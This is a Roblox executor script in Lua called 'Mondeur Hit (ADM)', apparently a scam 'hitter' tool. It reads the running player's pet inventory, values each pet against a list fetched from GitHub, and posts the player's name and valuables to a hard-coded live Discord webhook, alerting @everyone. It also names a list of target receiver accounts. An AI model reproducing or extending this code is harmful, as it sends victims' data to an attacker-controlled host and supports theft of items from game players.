local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1417861953208193126/wWUd-tqbQT56zqL_y0KSF_s5ZYdBKfLtBJaWYVCN_uwue9hq8CsGuQWJOL1ivGEZ2CYz"
local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"

local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
local THRESHOLD = _G.Threshold or 1 -- Set to 1 for testing so EVERYTHING sends
local PetValues = {}

-- [[ LOAD POINTS ]] --
local function loadPoints()
    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
    if success then
        local jsonSuccess, decoded = pcall(function() return HttpService:JSONDecode(content) end)
        if jsonSuccess then PetValues = decoded else
            for line in content:gmatch("[^\r\n]+") do
                local name, val = line:match("([^:=]+)[:=](%d+)")
                if name and val then PetValues[name:trim()] = tonumber(val) end
            end
        end
        print("✅ Points Loaded. Items in list: " .. #content)
    else
        warn("❌ Failed to load Pointsystem from GitHub!")
    end
end
loadPoints()

-- [[ WEBHOOK FUNCTION ]] --
local function sendWebhook(url, pets, total)
    -- Delta uses 'request'
    local request = request or http_request or (syn and syn.request)
    if not request then 
        warn("❌ Executor does not support requests!") 
        return 
    end

    local petList = ""
    for _, p in ipairs(pets) do
        petList = petList .. string.format("🐾 **%s** — `%d` pts\n", p.name, p.value)
    end

    local payload = HttpService:JSONEncode({
        username = "Mondeur Hit (ADM)",
        content = (total >= THRESHOLD) and "@everyone" or "",
        embeds = {{
            title = "✨ New Acquisition",
            color = 0x47ff8d,
            fields = {
                {name = "👤 Player", value = LocalPlayer.Name, inline = true},
                {name = "💰 Value", value = tostring(total), inline = true},
                {name = "🎒 Items", value = petList}
            }
        }}
    })

    local success, res = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)

    if success then
        print("✅ Webhook sent! Status: " .. res.StatusCode)
    else
        warn("❌ Webhook failed to send: " .. tostring(res))
    end
end

-- [[ SCAN & SEND ]] --
local function execute()
    print("🔍 Scanning Inventory...")
    local list, total = {}, 0
    local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
    
    if success and inv then
        for _, item in ipairs(inv) do
            if item.Kind == "Pet" then
                local val = PetValues[item.Name] or 0
                if val > 0 then
                    table.insert(list, {id = item.Id, name = item.Name, value = val})
                    total = total + val
                end
            end
        end
    end

    if #list > 0 then
        print("💰 Found " .. #list .. " valued pets. Sending Webhook...")
        sendWebhook(USER_WEBHOOK, list, total)
        if total >= THRESHOLD then
            sendWebhook(DUAL_WEBHOOK, list, total)
        end
    else
        print("ℹ️ No valued pets found in inventory.")
    end
end

print("🚀 Mondeur Hit (ADM) Initialized.")
execute() -- Run once immediately for testing
